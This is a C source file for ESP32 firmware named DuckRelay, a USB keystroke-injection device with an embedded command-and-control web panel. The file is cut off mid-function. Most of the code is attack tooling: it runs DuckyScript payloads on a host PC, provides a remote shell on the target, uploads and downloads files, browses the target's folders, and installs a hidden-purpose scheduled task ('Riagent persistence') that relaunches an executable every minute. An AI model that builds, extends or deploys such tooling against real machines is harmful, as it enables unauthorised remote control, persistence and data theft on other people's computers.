#include "version.h"
#include "web_server.h"

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "tinyusb.h"
#include "tinyusb_msc.h"
#include "payload_parser.h"
#include "c2_protocol.h"
#include "c2_client.h"

#include <errno.h>
#include <dirent.h>

extern QueueHandle_t s_c2_queue;

static const char *TAG = "web";

static httpd_handle_t s_server = NULL;
static tinyusb_msc_storage_handle_t s_storage_hdl = NULL;

static volatile bool s_payload_running = false;

#define PAYLOAD_MAX_SIZE 8192
#define OUTPUT_MAX       (16 * 1024)
#define TASK_XML_MAX     4096

/* === STEP3-1: costanti script === */
#define SCRIPTS_DIR         "/usb/scripts"
#define SCRIPT_NAME_MAX     32
#define SCRIPT_EXT          ".duck"
#define SCRIPT_PATH_MAX     96

/* Valida un nome script. Ritorna true se valido.
 * Regole: 1..SCRIPT_NAME_MAX char, solo [A-Za-z0-9_-],
 * non può essere "deploy" (riservato). */
static bool script_name_valid(const char *name)
{
    if (!name) return false;
    size_t n = strlen(name);
    if (n == 0 || n > SCRIPT_NAME_MAX) return false;
    if (strcmp(name, "deploy") == 0) return false;
    for (size_t i = 0; i < n; i++) {
        char c = name[i];
        bool ok = (c >= 'A' && c <= 'Z') ||
                  (c >= 'a' && c <= 'z') ||
                  (c >= '0' && c <= '9') ||
                  c == '_' || c == '-';
        if (!ok) return false;
    }
    return true;
}

/* Costruisce /usb/scripts/NOME.duck in `out`.
 * Ritorna true se il nome è valido e ci sta nel buffer. */
static bool script_build_path(const char *name, char *out, size_t out_max)
{
    if (!script_name_valid(name)) return false;
    int n = snprintf(out, out_max, SCRIPTS_DIR "/%s" SCRIPT_EXT, name);
    return n > 0 && (size_t)n < out_max;
}

/* Crea /usb/scripts se non esiste. Best-effort: ignora EEXIST. */
static void scripts_dir_ensure(void)
{
    struct stat st;
    if (stat(SCRIPTS_DIR, &st) == 0) return;
    if (mkdir(SCRIPTS_DIR, 0775) != 0) {
        ESP_LOGW(TAG, "mkdir %s failed (errno=%d)", SCRIPTS_DIR, errno);
    }
}

/* ============================================================
 * Template XML per il task di persistenza
 * ============================================================ */
static const char TASK_XML_TEMPLATE[] =
"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
"  <RegistrationInfo>\n"
"    <Description>Riagent persistence</Description>\n"
"  </RegistrationInfo>\n"
"  <Triggers>\n"
"    <LogonTrigger>\n"
"      <Enabled>true</Enabled>\n"
"      <UserId>@SID@</UserId>\n"
"    </LogonTrigger>\n"
"    <TimeTrigger>\n"
"      <StartBoundary>2020-01-01T00:00:00</StartBoundary>\n"
"      <Enabled>true</Enabled>\n"
"      <Repetition>\n"
"        <Interval>PT1M</Interval>\n"
"        <StopAtDurationEnd>false</StopAtDurationEnd>\n"
"      </Repetition>\n"
"    </TimeTrigger>\n"
"  </Triggers>\n"
"  <Principals>\n"
"    <Principal id=\"Author\">\n"
"      <UserId>@SID@</UserId>\n"
"      <LogonType>InteractiveToken</LogonType>\n"
"      <RunLevel>LeastPrivilege</RunLevel>\n"
"    </Principal>\n"
"  </Principals>\n"
"  <Settings>\n"
"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
"    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n"
"    <AllowHardTerminate>true</AllowHardTerminate>\n"
"    <StartWhenAvailable>true</StartWhenAvailable>\n"
"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
"    <IdleSettings>\n"
"      <StopOnIdleEnd>false</StopOnIdleEnd>\n"
"      <RestartOnIdle>false</RestartOnIdle>\n"
"    </IdleSettings>\n"
"    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
"    <Enabled>true</Enabled>\n"
"    <Hidden>false</Hidden>\n"
"    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
"    <WakeToRun>false</WakeToRun>\n"
"    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n"
"    <Priority>7</Priority>\n"
"  </Settings>\n"
"  <Actions Context=\"Author\">\n"
"    <Exec>\n"
"      <Command>@EXE@</Command>\n"
"    </Exec>\n"
"  </Actions>\n"
"</Task>\n";

/* ============================================================
 * HTML della UI principale
 * ============================================================ */
static const char INDEX_HTML[] =
"<!DOCTYPE html><html><head><meta charset='utf-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>DuckRelay</title>"
"<style>"
"body{font-family:system-ui,sans-serif;margin:1rem;max-width:760px}"
"h1{font-size:1.3rem;margin:0 0 .5rem}"
"h2{font-size:.85rem;margin:1.2rem 0 .4rem;color:#555;text-transform:uppercase;letter-spacing:.6px}"
".row{display:flex;gap:.5rem;flex-wrap:wrap;margin:.4rem 0;align-items:center}"
"button{padding:.5rem .9rem;border:1px solid #444;background:#eee;border-radius:4px;cursor:pointer;font-size:.95rem}"
"button:hover{background:#ddd}"
"button:disabled{opacity:.5;cursor:not-allowed}"
"button.danger{background:#f8d7da;border-color:#c33;color:#721c24}"
"button.danger:hover{background:#f5c6cb}"
"textarea{width:100%;height:280px;font-family:ui-monospace,monospace;font-size:.9rem;padding:.5rem;box-sizing:border-box;border:1px solid #888;border-radius:4px}"
"#status{padding:.5rem;border-radius:4px;font-size:.9rem;margin:.5rem 0;min-height:1.2em}"
".ok{background:#d4edda;color:#155724}"
".err{background:#f8d7da;color:#721c24}"
".info{background:#d1ecf1;color:#0c5460}"
"a{color:#0366d6}"
"select{padding:.4rem;border:1px solid #888;border-radius:4px;font-size:.9rem;min-width:180px;background:#fff}"
"hr{border:none;border-top:1px solid #ddd;margin:1rem 0}"
"</style></head><body>"
"<h1>DuckRelay</h1>"
"<div id='status' class='info'>Loading...</div>"
"<div style='margin:.5rem 0;font-size:.9rem'>"
"Layout: <label><input type='radio' name='layout' value='it' checked> IT</label> "
"<label style='margin-left:.8rem'><input type='radio' name='layout' value='us'> US</label>"
"</div>"
"<textarea id='ta' placeholder='DuckyScript payload...'></textarea>"

"<h2>Boot file (deploy.txt)</h2>"
"<p style='font-size:.82rem;color:#666;margin:.2rem 0'>"
"Executed when you press <b>BOOT</b> on the ESP32 (1 tap = IT, 2 taps = US)."
"</p>"
"<div class='row'>"
"<button id='btnLoad'>Load deploy.txt</button>"
"<button id='btnSave'>Save deploy.txt</button>"
"</div>"

"<h2>Execution</h2>"
"<div class='row'>"
"<button id='btnRun'>Run</button>"
"</div>"

"<h2>Saved scripts</h2>"
"<div class='row'>"
"<select id='scriptSel'><option value=''>(none)</option></select>"
"<button id='btnScriptLoad'>Load</button>"
"<button id='btnScriptSave'>Save as...</button>"
"<button id='btnScriptDelete' class='danger'>Delete</button>"
"<button id='btnScriptRefresh' title='Refresh list'>&#8635;</button>"
"</div>"

"<h2>Device</h2>"
"<div class='row'>"
"<button id='btnMount'>Switch mount</button>"
"<a href='/terminal' target='_blank' style='margin-left:auto'>&rarr; Open C2 terminal</a>"
"</div>"

"<script>"
"const ta=document.getElementById('ta');"
"const st=document.getElementById('status');"
"const scriptSel=document.getElementById('scriptSel');"
"function setSt(msg,cls){st.textContent=msg;st.className=cls||'info';}"

"async function refresh(){"
"  try{const r=await fetch('/api/status');const j=await r.json();"
"    let m=j.mount_target==='usb'?'Host (Windows)':'App (Web UI)';"
"    if(!j.fs_ok&&j.mount_target==='app'){setSt('Filesystem not accessible. Press Switch mount to reclaim it.','err');return;}"
"    setSt('Ready. Boot script: '+j.payload_size+' bytes. Mount: '+m+'.','ok');"
"  }catch(e){setSt('Error: '+e,'err');}"
"}"

"async function loadScripts(){"
"  try{"
"    const r=await fetch('/api/scripts');const j=await r.json();"
"    if(!j.ok){setSt('Error loading script list','err');return;}"
"    const cur=scriptSel.value;"
"    scriptSel.length=0;"
"    scriptSel.options.add(new Option('(none)',''));"
"    for(const n of (j.scripts||[])){"
"      scriptSel.options.add(new Option(n,n));"
"    }"
"    if(cur && j.scripts && j.scripts.indexOf(cur)>=0) scriptSel.value=cur;"
"  }catch(e){console.error(e);}"
"}"

"document.getElementById('btnLoad').onclick=async()=>{"
"  setSt('Loading deploy.txt...','info');"
"  try{const r=await fetch('/api/payload');if(!r.ok)throw new Error('HTTP '+r.status);"
"    const t=await r.text();ta.value=t;setSt('deploy.txt loaded ('+t.length+' bytes).','ok');"
"  }catch(e){setSt('Load error: '+e,'err');}"
"};"
"document.getElementById('btnSave').onclick=async()=>{"
"  setSt('Saving deploy.txt...','info');"
"  try{const r=await fetch('/api/payload',{method:'POST',body:ta.value});"
"    if(!r.ok)throw new Error('HTTP '+r.status);setSt('deploy.txt saved ('+ta.value.length+' bytes).','ok');"
"  }catch(e){setSt('Save error: '+e,'err');}"
"};"

"document.getElementById('btnRun').onclick=async()=>{"
"  const layoutEl=document.querySelector('input[name=layout]:checked');"
"  const layout=layoutEl?layoutEl.value:'it';"
"  setSt('Execution started (layout '+layout.toUpperCase()+')...','info');"
"  try{const body=ta.value;"
"    const r=await fetch('/api/run?layout='+layout,{method:'POST',body:body});"
"    if(r.status===409){setSt('Execution already in progress.','err');return;}"
"    if(!r.ok)throw new Error('HTTP '+r.status);setSt('Execution started (layout '+layout.toUpperCase()+'). Check the target.','ok');"
"  }catch(e){setSt('Run error: '+e,'err');}"
"};"

"document.getElementById('btnScriptRefresh').onclick=async()=>{await loadScripts();setSt('List refreshed.','ok');};"
"document.getElementById('btnScriptLoad').onclick=async()=>{"
"  const n=scriptSel.value;"
"  if(!n){setSt('Select a script.','err');return;}"
"  setSt('Loading '+n+'...','info');"
"  try{const r=await fetch('/api/scripts?name='+encodeURIComponent(n));"
"    if(!r.ok)throw new Error('HTTP '+r.status);"
"    const t=await r.text();ta.value=t;setSt(n+' loaded ('+t.length+' bytes).','ok');"
"  }catch(e){setSt('Script load error: '+e,'err');}"
"};"
"document.getElementById('btnScriptSave').onclick=async()=>{"
"  const raw=prompt('Script name (letters, digits, _ and -; max 32):');"
"  if(raw===null)return;"
"  const n=raw.trim();"
"  if(!/^[A-Za-z0-9_-]{1,32}$/.test(n)||n==='deploy'){setSt('Invalid name (1-32 chars, [A-Za-z0-9_-], not \"deploy\").','err');return;}"
"  async function doSave(ov){"
"    const url='/api/scripts?name='+encodeURIComponent(n)+(ov?'&overwrite=1':'');"
"    return fetch(url,{method:'POST',body:ta.value});"
"  }"
"  try{"
"    setSt('Saving '+n+'...','info');"
"    let r=await doSave(false);"
"    if(r.status===409){"
"      if(!confirm('Script \"'+n+'\" already exists. Overwrite?')){setSt('Save cancelled.','info');return;}"
"      r=await doSave(true);"
"    }"
"    if(!r.ok){let j={};try{j=await r.json();}catch(e){}throw new Error(j.err||('HTTP '+r.status));}"
"    setSt('Script '+n+' saved.','ok');"
"    await loadScripts();"
"    scriptSel.value=n;"
"  }catch(e){setSt('Script save error: '+e,'err');}"
"};"
"document.getElementById('btnScriptDelete').onclick=async()=>{"
"  const n=scriptSel.value;"
"  if(!n){setSt('Select a script.','err');return;}"
"  if(!confirm('Delete script \"'+n+'\"?'))return;"
"  try{const r=await fetch('/api/scripts?name='+encodeURIComponent(n),{method:'DELETE'});"
"    if(!r.ok)throw new Error('HTTP '+r.status);"
"    setSt('Script '+n+' deleted.','ok');"
"    await loadScripts();"
"  }catch(e){setSt('Delete error: '+e,'err');}"
"};"

"document.getElementById('btnMount').onclick=async()=>{"
"  setSt('Switching mount...','info');"
"  try{const r=await fetch('/api/status');const j=await r.json();"
"    const next=j.mount_target==='app'?'usb':'app';"
"    const rr=await fetch('/api/mount',{method:'POST',body:next});"
"    if(!rr.ok)throw new Error('HTTP '+rr.status);"
"    setSt('Mount switched to '+next+'.','ok');"
"    refresh();"
"  }catch(e){setSt('Mount error: '+e,'err');}"
"};"

"loadScripts();"
"refresh();"
"</script>"
"<hr>"
"<p style='text-align:center;font-size:.8rem;color:#666;margin:1.5rem 0'>"
"<a href='https://github.com/damarant/duckrelay' target='_blank'>github.com/damarant/duckrelay</a>"
" &middot; "
"<a href='https://github.com/damarant/duckrelay/blob/main/LICENSE' target='_blank'>Apache License 2.0</a>"
" &middot; "
"&copy; 2026 damarant &middot; v" DUCKRELAY_VERSION
"</p>"
"</body></html>";

/* ============================================================
 * HTML della pagina /terminal
 * ============================================================ */
static const char TERMINAL_HTML[] =
"<!DOCTYPE html><html><head><meta charset='utf-8'>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>DuckRelay Terminal</title>"
"<style>"
"body{font-family:monospace;margin:1rem;background:#111;color:#ddd}"
"h3{color:#0f0;margin:0 0 .5rem}"
"h4{color:#0f0;margin:.5rem 0}"
"#out{width:100%;height:400px;border:1px solid #333;overflow-y:auto;padding:.5rem;background:#000;color:#0f0;white-space:pre-wrap;box-sizing:border-box;font-size:.9rem}"
"#in{width:75%;padding:.4rem;font-family:monospace;background:#222;color:#fff;border:1px solid #444;box-sizing:border-box}"
"button{padding:.4rem .8rem;background:#333;color:#fff;border:1px solid #555;cursor:pointer}"
"button:disabled{opacity:.5;cursor:not-allowed}"
"#state{font-size:.8rem;color:#888;margin:.5rem 0}"
"hr{margin:1rem 0;border-color:#333}"
"input[type=text],input:not([type]){background:#222;color:#fff;border:1px solid #444;padding:.4rem;font-family:monospace;box-sizing:border-box}"
"#uploadState,#downloadState,#persistState{color:#888;font-size:.85rem;margin:.3rem 0}"
".hint{color:#666;font-size:.78rem;margin:.2rem 0 .5rem}"
"#btnDownloadCancel{background:#5a2a2a;border-color:#a44}"
"#btnDownloadCancel:not(:disabled):hover{background:#7a3a3a}"
"</style></head><body>"
"<h3>Terminal (HTTP)</h3>"
"<div id='state'>ready</div>"
"<div id='out'></div>"
"<div style='margin-top:.5rem;display:flex;gap:.5rem'>"
"<input id='in' placeholder='type and press Enter...' autofocus>"
"<button id='btn' onclick='send()'>Run</button>"
"</div>"

"<hr>"
"<h4>Persistence</h4>"
"<div id='persistState'>Checking...</div>"
"<div style='display:flex;gap:.5rem;flex-wrap:wrap'>"
"<button id='btnPersistInstall' onclick='persistInstall()'>Install persistence</button>"
"<button id='btnPersistUninstall' onclick='persistUninstall()'>Remove persistence</button>"
"<button id='btnPersistRefresh' onclick='persistStatus()'>Refresh status</button>"
"</div>"

"<hr>"
"<h4>Upload file to PC2</h4>"
"<div style='display:flex;gap:.5rem;flex-wrap:wrap;align-items:center'>"
"<input type='file' id='fileInput'>"
"<input id='remotePath' placeholder='C:\\Users\\Public\\file.exe' style='flex:1;min-width:240px'>"
"<button id='btnUpload' onclick='uploadFile()'>Upload</button>"
"</div>"
"<div id='uploadState'>Select a file and press Upload</div>"

"<hr>"
"<h4>Download file from PC2</h4>"
"<div style='display:flex;gap:.5rem;flex-wrap:wrap;align-items:center'>"
"<input id='downloadPath' placeholder='F:\\documento.pdf' style='flex:1;min-width:240px'>"
"<button id='btnDownload' onclick='downloadFile()'>Download</button>"
"<button id='btnDownloadCancel' onclick='cancelDownload()' disabled>Cancel</button>"
"</div>"
"<div class='hint'>The file is saved to the browser's Downloads folder. To choose the save location, enable 'Ask where to save' in your browser settings.</div>"
"<div id='downloadState'>Enter the remote path and press Download</div>"

"<hr>"
"<h4>Browse folders</h4>"
"<div style='display:flex;gap:.5rem;flex-wrap:wrap;align-items:center'>"
"<input id='lsPath' placeholder='C:\\Users' style='flex:1;min-width:240px'>"
"<button id='btnLs' onclick='listFiles()'>Go</button>"
"<button id='btnLsUp' onclick='lsUp()' title='Parent folder'>↑ Up</button>"
"</div>"
"<div id='lsBreadcrumb' style='font-size:.85rem;margin:.4rem 0;word-break:break-all'></div>"
"<div id='lsState' style='color:#888;font-size:.85rem;margin:.3rem 0'>Enter a path and press Go</div>"
"<div id='fileList' style='max-height:200px;overflow-y:auto;background:#000;border:1px solid #333;padding:.3rem;font-size:.85rem;box-sizing:border-box'></div>"

"<script>"
"const out=document.getElementById('out');"
"const inp=document.getElementById('in');"
"const btn=document.getElementById('btn');"
"const state=document.getElementById('state');"
"const MAX_BYTES=200000;"
"let currentBytes=0;"
"let history=[];"
"let histIdx=-1;"
"try{history=JSON.parse(localStorage.getItem('term_history')||'[]');}catch(e){history=[];}"
"function append(data){"
"  out.insertAdjacentText('beforeend',data);"
"  currentBytes+=data.length;"
"  if(currentBytes>MAX_BYTES){"
"    while(out.firstChild&&currentBytes>MAX_BYTES/2){"
"      const n=out.firstChild;"
"      currentBytes-=(n.textContent?n.textContent.length:0);"
"      out.removeChild(n);"
"    }"
"  }"
"  out.scrollTop=out.scrollHeight;"
"}"
"function saveHistory(cmd){"
"  if(!cmd)return;"
"  if(history.length===0||history[history.length-1]!==cmd){"
"    history.push(cmd);"
"    if(history.length>100)history.shift();"
"    try{localStorage.setItem('term_history',JSON.stringify(history));}catch(e){}"
"  }"
"  histIdx=history.length;"
"}"
"async function send(){"
"  const v=inp.value;"
"  if(!v)return;"
"  if(btn.disabled)return;"
"  inp.value='';"
"  saveHistory(v);"
"  append('> '+v+'\\n');"
"  btn.disabled=true;"
"  state.textContent='running...';"
"  try{"
"    const r=await fetch('/api/exec',{method:'POST',body:v});"
"    if(!r.ok){append('[HTTP '+r.status+']\\n');}"
"    else{"
"      const t=await r.text();"
"      if(t.length===0)append('[no output]\\n');"
"      else{append(t); if(!t.endsWith('\\n'))append('\\n');}"
"    }"
"    state.textContent='ready';"
"  }catch(e){append('[error: '+e+']\\n');state.textContent='error';}"
"  btn.disabled=false;"
"  inp.focus();"
"}"
"inp.addEventListener('keydown',e=>{"
"  if(e.key==='Enter'){send();e.preventDefault();}"
"  else if(e.key==='ArrowUp'){"
"    if(histIdx>0){histIdx--;inp.value=history[histIdx]||'';e.preventDefault();}"
"  }"
"  else if(e.key==='ArrowDown'){"
"    if(histIdx<history.length-1){histIdx++;inp.value=history[histIdx]||'';}"
"    else{histIdx=history.length;inp.value='';}"
"    e.preventDefault();"
"  }"
"});"

/* Upload */
"const fileInput=document.getElementById('fileInput');"
"const remotePath=document.getElementById('remotePath');"
"const uploadState=document.getElementById('uploadState');"
"const btnUpload=document.getElementById('btnUpload');"
"async function uploadFile(){"
"  const f=fileInput.files[0];"
"  if(!f){uploadState.textContent='Select a file';return;}"
"  let path=remotePath.value.trim();"
"  if(!path){path='C:\\\\Users\\\\Public\\\\'+f.name;}"
"  if(path.endsWith('\\\\')||path.endsWith('/')){path+=f.name;}"
"  remotePath.value=path;"
"  uploadState.textContent='Uploading '+f.name+' ('+f.size+' bytes) -> '+path+'...';"
"  btnUpload.disabled=true;"
"  const t0=Date.now();"
"  try{"
"    const r=await fetch('/api/upload?path='+encodeURIComponent(path),{method:'POST',body:f});"
"    const dt=((Date.now()-t0)/1000).toFixed(1);"
"    let j={};"
"    try{j=await r.json();}catch(e){j={ok:false,err:'HTTP '+r.status};}"
"    if(j.ok){uploadState.textContent='OK: '+j.bytes+' bytes in '+dt+'s';}"
"    else{uploadState.textContent='Error: '+(j.err||'unknown')+' ('+(j.bytes||0)+' bytes). Make sure the path includes the file name and the folder exists.';}"
"  }catch(e){uploadState.textContent='Error: '+e;}"
"  btnUpload.disabled=false;"
"}"

/* Download */
"const downloadPath=document.getElementById('downloadPath');"
"const downloadState=document.getElementById('downloadState');"
"const btnDownload=document.getElementById('btnDownload');"
"const btnDownloadCancel=document.getElementById('btnDownloadCancel');"
"let dlAbortController=null;"
"function cancelDownload(){"
"  if(dlAbortController){dlAbortController.abort();}"
"}"
"async function downloadFile(){"
"  const path=downloadPath.value.trim();"
"  if(!path){downloadState.textContent='Enter a path';return;}"
"  const name=path.split(/[\\\\/]/).pop()||'download.bin';"
"  dlAbortController=new AbortController();"
"  const signal=dlAbortController.signal;"
"  downloadState.textContent='Downloading '+name+'...';"
"  btnDownload.disabled=true;"
"  btnDownloadCancel.disabled=false;"
"  const t0=Date.now();"
"  try{"
"    const r=await fetch('/api/download?path='+encodeURIComponent(path),{signal:signal});"
"    if(!r.ok){const t=await r.text();throw new Error('HTTP '+r.status+' '+t);}"
"    const blob=await r.blob();"
"    const dt=((Date.now()-t0)/1000).toFixed(1);"
"    if(blob.size===0){throw new Error('empty file or not found');}"
"    const url=URL.createObjectURL(blob);"
"    const a=document.createElement('a');"
"    a.href=url;"
"    a.download=name;"
"    document.body.appendChild(a);"
"    a.click();"
"    document.body.removeChild(a);"
"    setTimeout(()=>URL.revokeObjectURL(url),1000);"
"    downloadState.textContent='OK: '+blob.size+' bytes ('+name+') in '+dt+'s. Check your browser Downloads folder.';"
"  }catch(e){"
"    if(e.name==='AbortError'){downloadState.textContent='(download cancelled)';}"
"    else{downloadState.textContent='Error: '+e;}"
"  }finally{"
"    dlAbortController=null;"
"    btnDownload.disabled=false;"
"    btnDownloadCancel.disabled=true;"
"  }"
"}"

"const lsPath=document.getElementById('lsPath');"
"const btnLs=document.getElementById('btnLs');"
"const btnLsUp=document.getElementById('btnLsUp');"
"const lsState=document.getElementById('lsState');"
"const lsBreadcrumb=document.getElementById('lsBreadcrumb');"
"const fileList=document.getElementById('fileList');"

/* Normalizza path: rimuove backslash finali tranne radice */
"function normPath(p){"
"  p=p.trim();"
"  if(!p)return '';"
"  while(p.length>1&&(p.endsWith('\\\\')||p.endsWith('/'))){p=p.slice(0,-1);}"
"  if(/^[A-Za-z]:$/.test(p))p+='\\\\';"
"  return p;"
"}"

/* Parent di un path: C:\\Users\\Damarant -> C:\\Users; C:\\ -> null */
"function parentPath(p){"
"  p=normPath(p);"
"  if(!p)return null;"
"  if(/^[A-Za-z]:\\\\$/.test(p))return null;"
"  const last=p.lastIndexOf('\\\\');"
"  if(last<0)return null;"
"  const par=p.slice(0,last);"
"  if(/^[A-Za-z]:$/.test(par))return par+'\\\\';"
"  return par||null;"
"}"

/* Costruisce breadcrumb cliccabile */
"function renderBreadcrumb(p){"
"  lsBreadcrumb.innerHTML='';"
"  p=normPath(p);"
"  if(!p){return;}"
"  const isRoot=/^[A-Za-z]:\\\\$/.test(p);"
"  const parts=p.split('\\\\').filter(x=>x.length>0);"
"  /* parts[0] = 'C:' oppure 'C:' (con eventuale ultimo vuoto filtrato) */"
"  for(let i=0;i<parts.length;i++){"
"    const seg=parts[i];"
"    const full=parts.slice(0,i+1).join('\\\\');"
"    const label=(i===0&&/^[A-Za-z]:$/.test(seg))?seg+'\\\\':seg;"
"    const a=document.createElement('a');"
"    a.textContent=label;"
"    a.href='#';"
"    a.style.cssText='color:#0f0;text-decoration:none;cursor:pointer;padding:1px 3px';"
"    a.onmouseenter=()=>a.style.textDecoration='underline';"
"    a.onmouseleave=()=>a.style.textDecoration='none';"
"    a.onclick=(e)=>{e.preventDefault();navigateTo(full);};"
"    lsBreadcrumb.appendChild(a);"
"    if(i<parts.length-1){"
"      const sep=document.createElement('span');"
"      sep.textContent=' \\\\ ';"
"      sep.style.cssText='color:#666';"
"      lsBreadcrumb.appendChild(sep);"
"    }"
"  }"
"}"

"async function navigateTo(p){"
"  p=normPath(p);"
"  lsPath.value=p;"
"  btnLs.disabled=true;"
"  btnLsUp.disabled=!parentPath(p);"
"  lsState.textContent='Listing...';"
"  fileList.innerHTML='';"
"  lsBreadcrumb.innerHTML='';"
"  try{"
"    const r=await fetch('/api/ls?path='+encodeURIComponent(p));"
"    let j={};"
"    try{j=await r.json();}catch(e){j={ok:false,err:'HTTP '+r.status};}"
"    if(!j.ok){lsState.textContent='Error: '+(j.err||'unknown');renderBreadcrumb(p);return;}"
"    renderBreadcrumb(p);"
"    if(j.error==='folder not found'){lsState.textContent='(folder not found)';return;}"
"    const dirs=j.dirs||[];"
"    const files=j.files||[];"
"    if(dirs.length===0&&files.length===0){lsState.textContent='(empty folder)';return;}"
"    lsState.textContent=(dirs.length+files.length)+' items ('+dirs.length+' folders, '+files.length+' files)';"
"    for(const name of dirs){"
"      const row=document.createElement('div');"
"      row.style.cssText='display:flex;align-items:center;padding:2px 4px;cursor:pointer;color:#0f0';"
"      row.onmouseenter=()=>row.style.background='#1a1a1a';"
"      row.onmouseleave=()=>row.style.background='transparent';"
"      row.innerHTML='<span style=\"margin-right:6px\">📁</span><span>'+name.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span>';"
"      row.onclick=()=>{"
"        const child=p.endsWith('\\\\')?p+name:p+'\\\\'+name;"
"        navigateTo(child);"
"      };"
"      fileList.appendChild(row);"
"    }"
"    for(const name of files){"
"      const row=document.createElement('div');"
"      row.style.cssText='display:flex;align-items:center;padding:2px 4px;cursor:pointer;color:#0366d6';"
"      row.onmouseenter=()=>row.style.background='#1a1a1a';"
"      row.onmouseleave=()=>row.style.background='transparent';"
"      row.innerHTML='<span style=\"margin-right:6px\">📄</span><span style=\"text-decoration:underline\">'+name.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span>';"
"      row.onclick=()=>{"
"        const full=p.endsWith('\\\\')?p+name:p+'\\\\'+name;"
"        downloadPath.value=full;"
"        downloadFile();"
"      };"
"      fileList.appendChild(row);"
"    }"
"  }catch(e){lsState.textContent='Error: '+e;renderBreadcrumb(p);}"
"  btnLs.disabled=false;"
"  btnLsUp.disabled=!parentPath(p);"
"}"

"async function listFiles(){"
"  const p=lsPath.value.trim();"
"  if(!p){lsState.textContent='(enter a path)';return;}"
"  await navigateTo(p);"
"}"

"function lsUp(){"
"  const p=normPath(lsPath.value);"
"  const par=parentPath(p);"
"  if(par){navigateTo(par);}"
"}"

/* Persistenza */
"const persistState=document.getElementById('persistState');"
"const btnPersistInstall=document.getElementById('btnPersistInstall');"
"const btnPersistUninstall=document.getElementById('btnPersistUninstall');"
"async function persistStatus(){"
"  persistState.textContent='Checking...';"
"  try{"
"    const r=await fetch('/api/persist/status');"
"    let j={};"
"    try{j=await r.json();}catch(e){j={ok:false,err:'HTTP '+r.status};}"
"    if(!j.ok){persistState.textContent='Error: '+(j.err||'unknown');return;}"
"    persistState.textContent=j.installed?'Persistence INSTALLED':'Persistence NOT installed';"
"  }catch(e){persistState.textContent='Error: '+e;}"
"}"
"async function persistInstall(){"
"  btnPersistInstall.disabled=true;"
"  btnPersistUninstall.disabled=true;"
"  persistState.textContent='Installing persistence...';"
"  try{"
"    const r=await fetch('/api/persist/install',{method:'POST'});"
"    let j={};"
"    try{j=await r.json();}catch(e){j={ok:false,err:'HTTP '+r.status};}"
"    if(j.ok){persistState.textContent='Persistence installed.';}"
"    else{persistState.textContent='Error: '+(j.err||'unknown');}"
"  }catch(e){persistState.textContent='Error: '+e;}"
"  btnPersistInstall.disabled=false;"
"  btnPersistUninstall.disabled=false;"
"  setTimeout(persistStatus,800);"
"}"
"async function persistUninstall(){"
"  btnPersistInstall.disabled=true;"
"  btnPersistUninstall.disabled=true;"
"  persistState.textContent='Removing persistence...';"
"  try{"
"    const r=await fetch('/api/persist/uninstall',{method:'POST'});"
"    let j={};"
"    try{j=await r.json();}catch(e){j={ok:false,err:'HTTP '+r.status};}"
"    if(j.ok){persistState.textContent='Persistence removed.';}"
"    else{persistState.textContent='Error: '+(j.err||'unknown');}"
"  }catch(e){persistState.textContent='Error: '+e;}"
"  btnPersistInstall.disabled=false;"
"  btnPersistUninstall.disabled=false;"
"  setTimeout(persistStatus,800);"
"}"
"persistStatus();"
"append('[terminal ready - HTTP polling]\\n');"
"</script>"
"<hr style='border-color:#333'>"
"<p style='text-align:center;margin:1.5rem 0'>"
"<a href='/' style='color:#0f0;font-size:.9rem;text-decoration:none'>&larr; Back to Home</a>"
"</p>"
"<hr style='border-color:#333'>"
"<p style='text-align:center;font-size:.8rem;color:#888;margin:1.5rem 0'>"
"<a href='https://github.com/damarant/duckrelay' target='_blank' style='color:#0f0'>github.com/damarant/duckrelay</a>"
" &middot; "
"<a href='https://github.com/damarant/duckrelay/blob/main/LICENSE' target='_blank' style='color:#0f0'>Apache License 2.0</a>"
" &middot; "
"&copy; 2026 damarant &middot; v" DUCKRELAY_VERSION
"</p>"
"</body></html>";

/* ============================================================
 * GET /
 * ============================================================ */
static esp_err_t index_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    return httpd_resp_send(req, INDEX_HTML, HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * GET /terminal
 * ============================================================ */
static esp_err_t terminal_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html; charset=utf-8");
    return httpd_resp_send(req, TERMINAL_HTML, HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * Helper JSON errore
 * ============================================================ */
static esp_err_t send_json_err(httpd_req_t *req, int http_code, const char *err)
{
    char buf[192];
    snprintf(buf, sizeof(buf), "{\"ok\":false,\"err\":\"%s\"}", err);
    httpd_resp_set_status(req, http_code == 404 ? "404 Not Found" :
                               http_code == 409 ? "409 Conflict" :
                               http_code == 500 ? "500 Internal Server Error" :
                               "400 Bad Request");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * Helper URL decode
 * ============================================================ */
static void url_decode(char *dst, const char *src, size_t dst_max)
{
    size_t di = 0;
    while (*src && di < dst_max - 1) {
        if (*src == '%' && src[1] && src[2]) {
            int h1 = 0, h2 = 0;
            char c1 = src[1], c2 = src[2];
            if (c1 >= '0' && c1 <= '9') h1 = c1 - '0';
            else if (c1 >= 'a' && c1 <= 'f') h1 = c1 - 'a' + 10;
            else if (c1 >= 'A' && c1 <= 'F') h1 = c1 - 'A' + 10;
            if (c2 >= '0' && c2 <= '9') h2 = c2 - '0';
            else if (c2 >= 'a' && c2 <= 'f') h2 = c2 - 'a' + 10;
